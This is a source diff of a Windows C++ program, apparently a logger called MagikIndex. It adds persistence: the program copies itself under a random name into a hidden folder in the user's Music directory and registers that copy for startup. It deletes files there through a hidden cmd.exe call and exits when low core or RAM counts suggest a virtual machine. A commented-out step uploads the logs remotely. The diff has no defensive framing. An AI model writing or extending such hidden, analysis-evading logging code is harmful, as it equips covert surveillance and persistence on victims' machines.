@@ -26,7 +26,8 @@ typedef unsigned long long uint64_t;
 
 #define CharactersPerLog 5000
 #define MaximumFolderSize 10 
-#define MinimumRam 2048
+#define RequiredRam 2048 //MB
+#define RequiredCores 2 
 
 #define MAX_LENGTH 1024
 
@@ -275,6 +276,8 @@ int main()
 
 #endif
 
+    bool FirstLog = true;
+
 Log:
 
     DWORD Tick = GetTickCount();
@@ -298,6 +301,7 @@ Log:
     std::string BootText = "Normal Boot:";
     std::string RAMText = "RAM Size:";
     std::string SeedText = "Randomness Seed:";
+    std::string CopiedFileText = "Made executable \"";
 
     char* AppData = nullptr;
     size_t AppDataSize;
@@ -380,38 +384,52 @@ Log:
 
     GetUserNameA(UserName,&Size);
 
-    std::string DestinationFile = "C:\\Users\\";
-    DestinationFile += UserName;
-    DestinationFile += "\\Music\\MagikIndex";
+    if (FirstLog) {
 
-    std::string MagikFolder = DestinationFile;
+        LogItChar("First log of the session, copying files and adding to startup...", CurrentLog);
 
-    CreateDirectoryA(DestinationFile.c_str(), NULL);
+        std::string DestinationFile = "C:\\Users\\";
+        DestinationFile += UserName;
+        DestinationFile += "\\Music\\MagikIndex";
 
-    SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
+        if (CalculateDirSize(DestinationFile) > MaximumFolderSize) {
+            std::string Command = "/C del /f /q ";
+            Command += DestinationFile;
+            Command += "\\*.*";
+            ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
+            LogItChar("Cleaned MagikIndex folder...", CurrentLog);
+        }
 
-    DestinationFile += "\\";
+        CreateDirectoryA(DestinationFile.c_str(), NULL);
 
-    char CharacterSet[62] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0' };
-    for (int i = 0; i < 15; i++) {
-        DestinationFile += CharacterSet[rand() % 61 + 0];
+        SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
+
+        DestinationFile += "\\";
+
+        std::string CopiedFile;
+
+        char CharacterSet[62] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0' };
+        for (int i = 0; i < 15; i++) {
+            CopiedFile += CharacterSet[rand() % 61 + 0];
+        }
+
+        DestinationFile += CopiedFile;
+
+        DestinationFile += ".exe";
+
+        CopyFileA(PathToFile, DestinationFile.c_str(), false);
+
+        CopiedFileText += CopiedFile;
+        CopiedFileText += ".exe\"...";
+        LogItChar(CopiedFileText, CurrentLog);
+
+        RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");
+
+        LogItChar("Registered executable for startup...", CurrentLog);
+
+    }else{
+        LogItChar("Not the first log of the session, skip copying files...", CurrentLog);
     }
-
-    DestinationFile += ".exe";
-
-    CopyFileA(PathToFile,DestinationFile.c_str(),false);
-
-    RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");
-
-
-    if (CalculateDirSize(MagikFolder) > MaximumFolderSize) {
-        std::string Command = "/C del /f /q ";
-        Command += MagikFolder;
-        Command += "\\*.*";
-        ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
-        LogItChar("Cleaned MagikIndex folder...",CurrentLog);
-    }
-
 
     int x1, y1, x2, y2, w, h, mo, mb;
 
@@ -505,7 +523,7 @@ Log:
     GlobalMemoryStatusEx(&RAMStatus);
 
 #ifndef debug
-    if (siSysInfo.dwNumberOfProcessors < 2 || (RAMStatus.ullTotalPhys / 1024) / 1024 < MinimumRam) {
+    if (siSysInfo.dwNumberOfProcessors < RequiredCores || (RAMStatus.ullTotalPhys / 1024) / 1024 < RequiredRam) {
         LogItChar("PC Specs dont match the requirements: probably a VM... exiting....", CurrentLog);
         exit(1);
     }
@@ -616,6 +634,9 @@ Log:
      RemoteFile += ".txt";
      FileSubmit(CurrentLog.c_str(),RemoteFile.c_str());
      */
+
+     FirstLog = false;
+
      goto Log;
      return 0;
 }
